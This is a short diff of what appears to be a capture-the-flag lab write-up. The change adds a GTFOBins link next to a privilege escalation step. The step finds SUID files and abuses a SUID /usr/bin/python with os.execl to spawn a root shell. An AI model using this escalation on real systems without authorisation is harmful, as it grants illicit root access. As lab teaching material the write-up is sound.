@@ -91,6 +91,7 @@ $ find / -perm -u=s -type f 2> /dev/null
 > *Answer:* /usr/bin/python
 
 ### root.txt
+[GTFOBins](https://gtfobins.github.io/)
 ```
 $ python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
 whoami
